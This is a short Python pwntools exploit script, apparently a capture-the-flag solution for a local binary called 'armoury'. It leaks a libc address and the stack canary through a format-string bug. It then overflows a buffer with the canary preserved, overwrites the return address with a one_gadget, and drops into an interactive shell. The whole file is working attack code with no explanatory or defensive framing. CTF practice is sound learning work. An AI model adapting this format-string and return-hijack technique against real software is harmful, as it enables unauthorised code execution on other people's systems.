from pwn import *

p = process('./armoury')
bin = ELF('./armoury')

one_gadget_offset = 0xe42ee # 0x4345e 0x434b2 0xe42ee

# gdb.attach(p, '')

# Format String, Libc leak
p.sendlineafter('get info:\n', '%p%13$p%17$p')
p.recvuntil('---\n')
result = p.recvuntil(':').split('0x')
libc_addr = int(result[1], 16) - 0x1b87e3
canary = int(result[2], 16)
one_gadget_addr = libc_addr + one_gadget_offset
log.info('Libc Addr: ' + hex(libc_addr))
log.info('Canary Value: ' + hex(canary))
log.info('One_gadget Addr: ' + hex(one_gadget_addr))

# Overwrite return addr with one_gadget
log.info(hex(canary | 0xff))
payload = 'A' * 39 + p64(canary | 0xff) + 'BBBBBBBB'
payload += p64(one_gadget_addr)
p.sendlineafter('get info:\n', payload)
payload = 'A' * 24
p.sendlineafter('feedback:\n', payload)

p.interactive()
